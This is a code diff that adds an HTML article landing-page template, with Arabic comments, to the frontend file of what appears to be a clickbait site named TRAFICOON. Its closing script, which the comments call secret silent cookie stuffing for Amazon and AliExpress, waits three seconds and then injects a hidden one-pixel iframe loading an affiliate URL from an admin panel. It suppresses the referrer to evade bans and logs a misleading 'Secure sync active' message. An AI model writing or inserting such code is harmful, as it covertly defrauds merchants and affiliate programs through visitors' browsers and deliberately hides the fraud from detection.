@@ -391,3 +391,121 @@ PAGE_HTML = """
 </body>
 </html>
 """
+
+
+
+# 👇👇👇 انسخ هذا وألصقه في آخر ملف frontend.py 👇👇👇
+
+# 3. صفحة المقال (Landing Page) مع زرع الكوكيز
+LANDING_HTML = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ article.title }}</title>
+    <meta name="description" content="{{ article.meta_desc }}">
+    <link rel="icon" type="image/png" href="https://b.top4top.io/p_3649zxju10.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,700;1,300&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #334155; }
+        .serif { font-family: 'Merriweather', serif; }
+        .prose p { margin-bottom: 1.5em; line-height: 1.8; font-size: 1.125rem; }
+        .prose h2 { font-weight: 700; margin-top: 2em; margin-bottom: 1em; color: #0f172a; font-size: 1.5rem; }
+        .prose img { border-radius: 8px; margin: 20px 0; width: 100%; }
+        .prose a { color: #2563eb; text-decoration: underline; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <!-- Navbar -->
+    <nav class="bg-white border-b border-slate-200 sticky top-0 z-50">
+        <div class="max-w-4xl mx-auto px-4 h-16 flex items-center justify-between">
+            <a href="/" class="flex items-center gap-2 font-black text-xl tracking-tighter text-slate-900">
+                TRAFICOON<span class="text-blue-600">.</span>
+            </a>
+            <a href="/" class="text-sm font-bold text-slate-500 hover:text-blue-600">Latest News</a>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="flex-grow max-w-3xl mx-auto px-4 py-10 w-full">
+        <article class="bg-white p-8 md:p-12 rounded-2xl border border-slate-200 shadow-sm">
+            
+            <!-- Header -->
+            <header class="mb-8 border-b border-slate-100 pb-8">
+                <span class="text-blue-600 font-bold text-xs uppercase tracking-widest">{{ category|default('Analysis') }}</span>
+                <h1 class="text-3xl md:text-4xl font-black text-slate-900 mt-3 mb-4 leading-tight serif">{{ article.title }}</h1>
+                <div class="text-slate-400 text-sm flex items-center gap-2">
+                    <span>{{ article.created_at.strftime('%B %d, %Y') if article.created_at else 'Just Now' }}</span>
+                    <span>•</span>
+                    <span>3 min read</span>
+                </div>
+            </header>
+
+            <!-- Image -->
+            {% if article.image %}
+            <div class="mb-10 -mx-6 md:-mx-0">
+                <img src="https://images.weserv.nl/?url={{ article.image }}&w=800&q=85&output=webp" alt="{{ article.title }}" class="w-full h-auto md:rounded-xl">
+            </div>
+            {% endif %}
+
+            <!-- Body -->
+            <div class="prose max-w-none text-slate-700 serif">
+                {{ article.body|safe }}
+            </div>
+
+            <!-- Share / Actions -->
+            <div class="mt-12 pt-8 border-t border-slate-100 flex justify-center">
+                <a href="/" class="bg-slate-900 text-white px-8 py-3 rounded-full font-bold text-sm hover:bg-slate-800 transition">Read Next Article</a>
+            </div>
+        </article>
+
+        <!-- Related Posts -->
+        {% if related_posts %}
+        <div class="mt-12">
+            <h3 class="font-bold text-slate-900 text-lg mb-4">Recommended for you</h3>
+            <div class="grid gap-4">
+                {% for post in related_posts %}
+                <a href="/v/{{ post.slug }}" class="block bg-white p-4 rounded-xl border border-slate-200 hover:border-blue-500 transition flex items-center gap-4">
+                    <div class="flex-grow">
+                        <h4 class="font-bold text-slate-800">{{ post.title }}</h4>
+                        <span class="text-xs text-slate-400 mt-1 block">Read Article →</span>
+                    </div>
+                </a>
+                {% endfor %}
+            </div>
+        </div>
+        {% endif %}
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-slate-50 border-t border-slate-200 py-8 text-center mt-auto">
+        <p class="text-slate-400 text-xs">© 2025 TRAFICOON Media Inc.</p>
+    </footer>
+
+    <!-- 🔥 الكود السري: زرع الكوكيز الصامت (لأمازون/علي إكسبريس) 🔥 -->
+    {% if s and s.stuffing_url %}
+    <script>
+        window.addEventListener('load', function() {
+            // ننتظر 3 ثواني ليطمئن الزائر ويبدأ القراءة
+            setTimeout(function() {
+                var f = document.createElement('iframe');
+                f.style.display = 'none'; // مخفي تماماً
+                f.style.width = '1px'; 
+                f.style.height = '1px';
+                f.src = "{{ s.stuffing_url }}"; // الرابط يأتي من لوحة التحكم
+                f.referrerPolicy = "no-referrer"; // حماية حسابك من الحظر
+                
+                // إضافة الـ iframe للصفحة
+                document.body.appendChild(f);
+                console.log('Secure sync active.');
+            }, 3000); 
+        });
+    </script>
+    {% endif %}
+
+</body>
+</html>
+"""
